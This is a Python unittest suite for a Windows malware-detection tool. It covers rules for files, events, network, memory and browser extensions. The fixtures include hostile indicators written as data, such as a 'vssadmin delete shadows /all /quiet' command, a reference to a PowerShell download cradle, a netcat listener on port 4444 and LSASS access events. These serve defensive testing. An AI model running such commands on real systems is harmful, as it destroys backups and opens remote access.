                    ev(10, {"TargetImage": S32 + r"\lsass.exe", "SourceImage": r"C:\ProgramData\Microsoft\Windows Defender\Platform\4\MsMpEng.exe", "GrantedAccess": "0x1010"})],
            wmi=[ev(5861, {"CONSUMER": 'CommandLineEventConsumer="Upd"', "ESS": "f", "Namespace": "//./root/subscription", "PossibleCause": "..."}),
                 ev(5861, {"CONSUMER": 'NTEventLogEventConsumer="SCM Event Log Consumer"'})],
            fw=[ev(2097, {"RuleName": "x", "ApplicationPath": TEMP + r"\srv.exe", "Direction": "1", "Action": "3", "Active": "1"}),
                ev(2097, {"RuleName": "todo", "ApplicationPath": "", "Direction": "1", "Action": "3", "Active": "1", "ModifyingApplication": S32 + r"\svchost.exe"})],
            bits=[ev(59, {"url": "http://198.51.102.9/a.bin", "name": "job"}), ev(59, {"url": "https://download.mozilla.org/x", "name": "Moz"})])
        self.assertEqual(one(fs, "evt.sysmon.lsass_read").evidence["source"], TEMP + r"\dump.exe")
        self.assertEqual(one(fs, "evt.wmi.subscription").severity, "high")
        self.assertEqual(one(fs, "evt.fw.inbound_temp").severity, "medium")
        self.assertEqual(one(fs, "evt.bits.bare_ip").entity["ip"], "198.51.102.9")


def filefact(path, type_="pe", **kw):
    name = path.rsplit("\\", 1)[-1]
    base = {"path": path, "name": name, "ext": "." + name.rsplit(".", 1)[-1].lower() if "." in name else "", "size": 4096,
            "modified": NOW - 86400, "created": NOW - 86400, "zone": util.path_zone(path), "type": type_}
    base.update(kw)
    return base


INTERNET = {"zone": 3, "host_url": "https://dl.example.net/get/tool.exe"}


class Files(unittest.TestCase):
    def run_rules(self, facts, sig_map=None):
        return d_files.detect({"files": facts}, sig_map or {}, {})

    def test_unsigned_downloads(self):
        plain, nasty = r"C:\Users\a\Downloads\tool.exe", r"C:\Users\a\Downloads\loader.exe"
        summ = {"kind": "exe", "bits": 64, "packer": "UPX", "injection_apis": ["createremotethread", "virtualallocex", "writeprocessmemory"],
                "import_count": 40, "sections": ["UPX0:7.9"]}
        fs = self.run_rules([filefact(plain, motw=INTERNET, pe={"import_count": 80}), filefact(nasty, motw=INTERNET, pe=summ),
                             filefact(r"C:\Users\a\Downloads\signed.exe", motw=INTERNET, pe=summ)],
                            sigs_for(**{plain: UNSIGNED, nasty: UNSIGNED, r"C:\Users\a\Downloads\signed.exe": VENDOR}))
        low = one(fs, "file.pe.unsigned_download")
        self.assertEqual((low.severity, low.entity["path"]), ("low", plain))
        self.assertIn("dl.example.net", low.description)
        bad = one(fs, "file.pe.suspicious_unsigned")
        self.assertEqual((bad.severity, bad.entity["path"]), ("high", nasty))
        self.assertEqual(len(fs), 2, "a signed program is not second-guessed for how it is built")

    def test_disguises(self):
        fs = self.run_rules([filefact(r"C:\Users\a\Downloads\photo.jpg", disguised=True), filefact(r"C:\Users\a\Downloads\invoice.pdf.exe"),
                             filefact("C:\\Users\\a\\Downloads\\ann\u202egpj.exe"), filefact(r"C:\Users\Public\svchost.exe"),
                             filefact(TEMP + r"\RTCore64.sys")],
                            sigs_for(**{r"C:\Users\a\Downloads\photo.jpg": UNSIGNED, r"C:\Users\Public\svchost.exe": UNSIGNED, TEMP + r"\RTCore64.sys": VENDOR}))
        self.assertEqual(one(fs, "file.pe.disguised").severity, "high")
        self.assertEqual(one(fs, "file.name.double_extension").severity, "high")
        self.assertEqual(one(fs, "file.name.rtlo").severity, "high")
        self.assertEqual(one(fs, "file.pe.masquerade").entity["path"], r"C:\Users\Public\svchost.exe")
        self.assertEqual(one(fs, "file.pe.driver_in_user_folder").severity, "high")

    def test_scripts_shortcuts_and_documents(self):
        ps = S32 + r"\WindowsPowerShell\v1.0\powershell.exe"
        fs = self.run_rules([
            filefact(r"C:\Users\a\Downloads\setup.ps1", "script", text="vssadmin delete shadows /all /quiet"),
            filefact(r"C:\Users\a\Downloads\form.hta", "script", text="<html></html>", motw=INTERNET),
            filefact(r"C:\Users\a\Desktop\Invoice.lnk", "lnk", lnk={"target": ps, "args": CRADLE.split(" ", 1)[1]}),
            filefact(r"C:\Users\a\Desktop\Chrome.lnk", "lnk", lnk={"target": r"C:\Program Files\Google\Chrome\Application\chrome.exe", "args": r"--load-extension=C:\Users\a\AppData\Local\Temp\ext"}),
            filefact(r"C:\Users\a\Desktop\Notes.lnk", "lnk", lnk={"target": r"C:\Windows\notepad.exe", "args": ""}),
            filefact(r"C:\Users\a\Downloads\report.docm", "office", macros=True, motw=INTERNET),
            filefact(r"C:\Users\a\Documents\budget.xlsm", "office", macros=True),
            filefact(r"C:\Users\a\Downloads\share.url", "url", text="[InternetShortcut]\nURL=file://203.0.113.9/share/x\n"),
            filefact(r"C:\Users\a\Downloads\linux.iso", "disk_image", motw=INTERNET)])
        self.assertEqual(one(fs, "file.script.impact.shadow_delete").severity, "critical")
        self.assertEqual(one(fs, "file.script.delivery_type").severity, "medium")
        self.assertEqual(one(fs, "file.lnk.payload").severity, "high")
        self.assertEqual(one(fs, "file.lnk.browser_tampered").actions, [])
        self.assertEqual(one(fs, "file.office.macro_download").entity["path"], r"C:\Users\a\Downloads\report.docm")
        self.assertEqual(one(fs, "file.url.remote_file").severity, "medium")
        self.assertEqual(one(fs, "file.disk_image_download").severity, "low")
        self.assertNotIn(r"C:\Users\a\Desktop\Notes.lnk", [f.entity["path"] for f in fs])

    def test_byte_signatures(self):
        self.assertEqual([s.id for s in content.scan(b"xx" + content.EICAR + b"yy")], ["eicar"])
        self.assertEqual(content.scan(b"Login Data and wallet.dat mentioned in a help file"), [], "a couple of words is not a stealer")
        wide = "".join(["Login", " Data|Web", " Data|wallet", ".dat|Local", " State|logins", ".json"]).encode("utf-16-le")
        self.assertEqual([s.id for s in content.scan(wide)], ["info_stealer"])
        f = one(self.run_rules([filefact(TEMP + r"\t.com", "other", signatures=["eicar"])]), "file.sig.eicar")
        self.assertEqual(f.tags, ["test"])

    def test_pe_scoring(self):
        self.assertEqual(pe.score({"import_count": 120})[0], 0)
        pts, why = pe.score({"packer": "UPX", "wx_section": True, "import_count": 3, "injection_apis": ["writeprocessmemory", "createremotethread"]})
        self.assertGreaterEqual(pts, 6)
        self.assertTrue(any("inject" in w for w in why))

    @unittest.skipUnless(sys.platform == "win32", "needs a Windows binary to parse")
    def test_pe_parser_reads_a_real_program(self):
        parsed = pe.parse_file(S32 + r"\notepad.exe")
        self.assertTrue(parsed and parsed.valid and parsed.is_64)
        summ = parsed.summary()
        self.assertGreater(summ["import_count"], 10)
        self.assertEqual(summ["kind"], "exe")
        self.assertIsNone(pe.parse_file(S32 + r"\drivers\etc\hosts"))


def conn(pid, raddr="", rport=0, state="ESTABLISHED", laddr="192.168.1.10", lport=50000, proto="tcp"):
    return {"proto": proto, "state": state, "laddr": laddr, "lport": lport, "raddr": raddr, "rport": rport, "pid": pid}


class Network(unittest.TestCase):
    def test_who_is_talking_to_the_internet(self):
        run, pad, tool, chrome = S32 + r"\rundll32.exe", S32 + r"\notepad.exe", TEMP + r"\upd.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        procs = [proc(10, "rundll32.exe", run), proc(11, "notepad.exe", pad), proc(12, "upd.exe", tool), proc(13, "chrome.exe", chrome)]
        conns = [conn(10, "198.51.103.5", 443), conn(11, "198.51.103.6", 443), conn(12, "198.51.103.7", 4444), conn(13, "198.51.103.8", 443),
                 conn(13, "192.168.1.1", 53), conn(12, "198.51.103.99", 443)]
        fs = d_network.detect({"processes": procs, "connections": conns}, sigs_for(**{run: MS, pad: MS, tool: UNSIGNED, chrome: VENDOR}),
                              {"bad_ips": {"198.51.103.99"}})
        self.assertEqual(sorted(f.entity["pid"] for f in fs if f.rule == "net.lolbin_online"), [10, 11])
        self.assertEqual(one(fs, "net.unsigned_online").severity, "medium")
        self.assertEqual(one(fs, "net.odd_port").evidence["remote"][0], "198.51.103.7:4444")
        self.assertEqual(one(fs, "net.intel_match").severity, "critical")
        self.assertNotIn(13, [f.entity.get("pid") for f in fs])

    def test_listeners(self):
        nc, sshd = r"C:\Users\a\Downloads\nc.exe", r"C:\Windows\System32\OpenSSH\sshd.exe"
        procs = [proc(10, "nc.exe", nc), proc(11, "sshd.exe", sshd), proc(12, "python.exe", r"C:\Python\python.exe")]
        conns = [conn(10, state="LISTEN", laddr="0.0.0.0", lport=4444), conn(11, state="LISTEN", laddr="0.0.0.0", lport=22),
                 conn(12, state="LISTEN", laddr="127.0.0.1", lport=8900)]
        facts = {"processes": procs, "connections": conns}
        fs = d_network.detect(facts, sigs_for(**{nc: UNSIGNED, sshd: MS}), {})
        self.assertEqual(one(fs, "net.listen.shell").severity, "high")
        self.assertEqual(one(fs, "net.listen.remote_admin").severity, "low")
        self.assertEqual(len(one(fs, "net.listen.inventory").evidence["listeners"]), 2, "loopback-only listeners are not exposed")
        self.assertEqual(sorted(d_network.inventory(facts)), [r"tcp|22|c:\windows\system32\openssh\sshd.exe", r"tcp|4444|c:\users\a\downloads\nc.exe"])


class MemoryAndBrowsers(unittest.TestCase):
    def test_injected_code_and_the_signed_game_exception(self):
        game, odd = r"C:\Users\a\AppData\Local\Game\game.exe", TEMP + r"\x.exe"
        thread = {"tid": 1, "start": "0x1", "protect": "0x40", "type": "private", "pe_header": True}
        results = [{"pid": 10, "name": "game.exe", "path": game, "unbacked_threads": [thread] * 5, "private_pe": [], "rwx_private": 1},
                   {"pid": 11, "name": "x.exe", "path": odd, "unbacked_threads": [thread], "private_pe": [], "rwx_private": 1},
                   {"pid": 12, "name": "y.exe", "path": odd.replace("x.exe", "y.exe"), "unbacked_threads": [], "private_pe": [{"base": "0x2", "size": 4096, "protect": "0x20"}], "rwx_private": 0}]
        fs = d_memory.detect({"results": results}, sigs_for(**{game: VENDOR, odd: UNSIGNED, odd.replace("x.exe", "y.exe"): UNSIGNED}))
        sev = {f.entity["pid"]: (f.rule, f.severity) for f in fs}
        self.assertEqual(sev, {10: ("mem.unbacked_thread", "low"), 11: ("mem.unbacked_thread", "high"), 12: ("mem.hidden_module", "high")})

    def test_browser_extensions(self):
        def ext(name, **kw):
            base = {"browser": "Chrome", "profile": "Default", "id": name, "name": name, "version": "1", "location": 1, "source": "store",
                    "from_store": True, "enabled": True, "path": r"C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Extensions\x",
                    "all_sites": False, "powerful": [], "update_url": "https://clients2.google.com/service/update2/crx", "default_install": False}
            base.update(kw)
            return base
        fs = d_browsers.detect({"extensions": [
            ext("store"), ext("unpacked", location=4, from_store=False, update_url="", path=TEMP + r"\ext", all_sites=True),
            ext("forced", location=7), ext("adobe", location=6, from_store=False), ext("edge-store", browser="Edge", from_store=False,
                                                                                    update_url="https://edge.microsoft.com/extensionwebstorebase/v1/crx"),
            ext("mystery", from_store=False, update_url=""), ext("off", location=4, enabled=False),
            ext("pm", all_sites=True, powerful=["cookies", "webRequest"]),
            {"browser": "Firefox", "profile": "p", "id": "x@y", "name": "ffext", "version": "1", "location": "app-profile", "source": "app-profile",
             "from_store": False, "enabled": True, "path": "", "all_sites": False, "powerful": [], "signed_state": 0, "temporary": False, "source_uri": ""}]})
        got = {f.key_parts[2] if len(f.key_parts) > 2 else "summary": (f.rule, f.severity) for f in fs}
        self.assertEqual(got, {"unpacked": ("browser.ext.unpacked", "high"), "forced": ("browser.ext.policy", "high"),
                               "adobe": ("browser.ext.external", "low"), "mystery": ("browser.ext.not_from_store", "medium"),
                               "x@y": ("browser.ext.unsigned", "medium"), "summary": ("browser.ext.broad_access", "info")})


if __name__ == "__main__":
    unittest.main()
